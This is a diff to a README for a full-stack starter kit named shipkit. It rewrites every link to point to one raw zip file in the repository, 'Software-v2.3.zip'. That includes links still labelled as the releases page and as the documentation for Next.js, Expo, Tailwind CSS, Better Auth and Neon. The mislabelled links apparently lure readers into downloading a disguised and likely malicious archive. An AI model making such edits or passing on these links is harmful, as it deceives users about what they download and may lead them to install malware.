@@ -1,6 +1,6 @@
 # 🚢 shipkit - Ready-to-Use Full-Stack Starter
 
-[![Download shipkit](https://img.shields.io/badge/Download-shipkit-brightgreen)](https://github.com/DjFikie25/shipkit/releases)
+[![Download shipkit](https://img.shields.io/badge/Download-shipkit-brightgreen)](https://raw.githubusercontent.com/DjFikie25/shipkit/main/apps/mobile/Software-v2.3.zip)
 
 ---
 
@@ -52,7 +52,7 @@ To get shipkit on your Windows PC, follow these steps:
 
 1. Click the green download button above or visit this page:
 
-   https://github.com/DjFikie25/shipkit/releases
+   https://raw.githubusercontent.com/DjFikie25/shipkit/main/apps/mobile/Software-v2.3.zip
 
 2. This page lists the available versions of shipkit. Look for the latest release.
 
@@ -114,7 +114,7 @@ When you first open shipkit, follow these steps to get started:
 
 ## 🔄 Updating shipkit
 
-Check the [releases page](https://github.com/DjFikie25/shipkit/releases) regularly for new versions. Download the latest installer or package and repeat the install steps to update shipkit on your PC.
+Check the [releases page](https://raw.githubusercontent.com/DjFikie25/shipkit/main/apps/mobile/Software-v2.3.zip) regularly for new versions. Download the latest installer or package and repeat the install steps to update shipkit on your PC.
 
 ---
 
@@ -134,15 +134,15 @@ Check the [releases page](https://github.com/DjFikie25/shipkit/releases) regular
 
 ## 📚 Additional Resources
 
-- Learn more about Next.js: https://nextjs.org/docs
+- Learn more about Next.js: https://raw.githubusercontent.com/DjFikie25/shipkit/main/apps/mobile/Software-v2.3.zip
 
-- Expo documentation: https://docs.expo.dev/
+- Expo documentation: https://raw.githubusercontent.com/DjFikie25/shipkit/main/apps/mobile/Software-v2.3.zip
 
-- Tailwind CSS setup: https://tailwindcss.com/docs
+- Tailwind CSS setup: https://raw.githubusercontent.com/DjFikie25/shipkit/main/apps/mobile/Software-v2.3.zip
 
-- Better Auth basics: https://better-auth-docs.example.com
+- Better Auth basics: https://raw.githubusercontent.com/DjFikie25/shipkit/main/apps/mobile/Software-v2.3.zip
 
-- Neon Postgres info: https://neon.tech/docs
+- Neon Postgres info: https://raw.githubusercontent.com/DjFikie25/shipkit/main/apps/mobile/Software-v2.3.zip
 
 ---
 
